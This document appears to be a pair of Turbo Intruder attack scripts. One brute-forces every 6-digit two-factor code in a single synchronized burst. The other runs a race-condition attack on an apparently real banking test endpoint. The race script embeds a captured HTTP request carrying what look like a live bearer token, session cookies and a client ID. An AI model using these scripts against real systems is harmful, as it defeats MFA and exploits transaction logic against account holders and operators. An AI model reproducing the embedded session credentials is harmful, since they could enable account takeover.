## 2FA bruteforce:
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1000000,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for num in range(0, 1000000):
	      mfa_code = '{0:06}'.format(num)
	      engine.queue(target.req, mfa_code.rstrip(), gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)

```

## Race condition
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=60,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    req2 = '''POST /api/openingaccount/v1/updaterate HTTP/1.1
Host: wwwuat.octoclicks.co.id
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Authorization: Bearer 46588eb1e4e0bdc806ad8f91b5661cc1b5e6edfa287fc98cf29dd48552d83806
Content-Length: 35
Origin: https://wwwuat.octoclicks.co.id
Connection: close
Referer: https://wwwuat.octoclicks.co.id/applyandinvest/saving/verify/
Cookie: JSESSIONID=ldwW81a3Ezovtysh6sp7e4vXVVZayTG_JgRA1KTn; __gdic=kgpyeh03biwhncrsnth; ___r1125286=0.223120639471; 2fd5dc92fa3d2ab68a8a242624ddfd2a=94f312ab1616c33a36b41bdfeb44a003; 935e00b23fb8c9c5cbc75f603bda5ab0=94f312ab1616c33a36b41bdfeb44a003; 1010963fbddeadbafe39ef4b2768ea4f=b055e93a3846029572d1c331576526c1; 50302289cd4dc1e06fb7aafee5f1c5ee=eb47e11c4ee01354bdd65bff9e291079; ___tk1125286=0.29900990446664666; 91f7730028b29ac55203b835773d2c72=e0f5ec74547d76f28c71555160ddb3e0; 9149a0c743c65dad1dad9d21d3285eb0=c665b239e5dffb3ab19dcf1189126108; 1796fe2f729c89d33765b5d7f9ef88f7=421fe2827c9c6003fa2cc4e59dfc50c6; 734adc7644b5026b9f0e3fe7ddff94cd=f1839e4f2eb0ff38fd60459473d92cda; f46711f074a1ee57ccb6205880a71420=b5a1f367559227203097202624f7d749; 8e7963d176ad2cfbfcd7dade9b2b70e5=4f9b1c24cda823871226e6335f95e119; 03c9c55d382b0960d8c315d16b7a090c=70f315b9c8bf46e3648f13d94c8f1444; 5013148e3b9926ff0e66b8c225906f92=e05b0acbe9d77dcd0adffc62a1e09e64; b67e2ac62749018cafbd992267f79c5d=e89de5d485a4845d55de292b16721575; 431719780d0af168764cfdeba4e4c5f5=bc86d15c421ca399962b8a642c889742; ebf4624865d87a364a7bd72056971da4=89932b3d016c46b23aa13a02ed3a93fb; 0be515a3d0338101154533fd8a90a286=b432b829cee0148a1e1a1095bd77e3c6; visid_incap_2320799=CVOstBDbQhup1NE+wk+dlsWCn18AAAAAQUIPAAAAAAAr3nQGt7KZ1jM73pfglF8j; incap_ses_1221_2320799=eMjUH/GqZExdQRvZKt3xED5Jol8AAAAAH1xHH1AjcyeeFCRCyTWoUg==; 5a2a9816071a6bd813eb8b3086e12a63=c99f5d1b13b15220bb21cdaa296f4d35; eced2f98ccec78c3e92335531601b771=c1cf57e488d4eebd80a20d8cfa17470c; b560f69904969a8bad051240ff0664fa=4a90f8de389ea69fd1d39a63c4cbb9bb; 23e8e6d696bc66666be716ee67617a42=43e28eda6e786dd6deffc80326875090; a0b1b14e5461bf7ac425732d692d9637=4b763fbf0703cf065f6fc570ff9ec1d1; e17f6c30d317db3f84bb957f277c6cd8=c0a59e235cce498ab0beaead090ff0ba; 81c1fac6cc39988292a04dad03be95a0=a822e5fe6febd51a96d777c63bf4ec96; 25494e2a545168fafbfd3b637f623891=13d000bbfab98548fda54f1e4dc9f75b; bbedf10a53132271c2558ee032266a83=c8eb25ac5ceed4e9709905cf629a717e; 30b285a37d267f9d57f93a24f752e2e8=7235b4b6956b45f39ae5825005463733; a6c8c0fa3af3121146cf8e12ec1d7b2b=b832716ae226a5539ef16acedff7b4bb; 99fec24c8133f90e365b535ce23bf6b1=c76277fb92fbb516ab4c75df397d62be; 1a00886326cc8047f8063402f97a1054=20562488b27ef1e7746da4c991486415; 110abb6d8cd91286e2d8fe2278337f6e=727a803a69ced075c857bb59fddacb5c; 56348f8f231476ebcd80778eacf53104=b79824d6f11a05b949337c8ba6e28d9e; 89c1e96ba686d98702af4bd5dcc06122=868bd534ba22a6d39c7df9e64d631fcd; nlbi_2320799=ldl7B09MBjy301bXi3gVnQAAAAAtRJWWKaBKGLQ9WB/vEgMA; af91147168e1c7e3624cfd7b84317291=ccaa3dcb4783b8c0050414b696029d23; b9471f7c8a29f31dd07b0420f0bd7f0e=d6fc9ed7e4ac2d2d139b82b532bc0f94; cdc5b926a7a0f8414dc2845e3faf57a3=53e462412e105d55ae9ed9796c425c44; complexity=MGN0b0NsMWNrczEyMDIwIQ==|QyOs3naQoyMKxHxq7Dm3Wg==; clientId=601eb1c1f2fec2076ce69454d1870243d70b821ffad8e2d4041181ec6a3493a6; ___so1125286=eyJsc2giOjIwNDE0NzA0MDMsInJzIjoxLCJzb3QiOiJvdGhlciIsInNkIjpudWxsLCJzZGMiOm51bGwsImUiOnsibiI6MywiYSI6W3siOCI6dHJ1ZSwic3IiOiJodHRwczovL3d3d3VhdC5vY3RvY2xpY2tzLmNvLmlkL2VtcHR5Lmh0bWwifSwiOCJdLCJyaWQiOjAuNDQzNTg4NTI2NzA3MjczNDV9fQ%3D%3D; LSESSIONID=eyJpIjoiM2FcL21PdXFwUDFvcWVqS0lBVEJTSmc9PSIsImUiOiIxOXd4amR1XC9cL3VjcFVTaU1QRjNveVRSMEgrNGNQbTd0RENmXC9HNWtGWnd2eG9TSXBsKzlNeDJ3cFZFTEc3TlJZRVU2SGg4cWg5ZkxrYTE1eWVxRURZZ0hyZlRJR2NEN2RHa1ZpekNBK0wzcU5NT3Z6YzNlWERoVlNLVnlLa1M5NjhmZ01GczFrTzRyV3VcL0tKZGZJTjBhSmhTU2NnTGtKSUhnbmJVclZnWnZJPSJ9.e1fbf6b7371e5538

{"transactionId":"%s"}
'''
    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for i in range(30):
        engine.queue(target.req, ["iphone"], gate='race1')
        #engine.queue(req2, ["RB1104000136433"], gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)

```
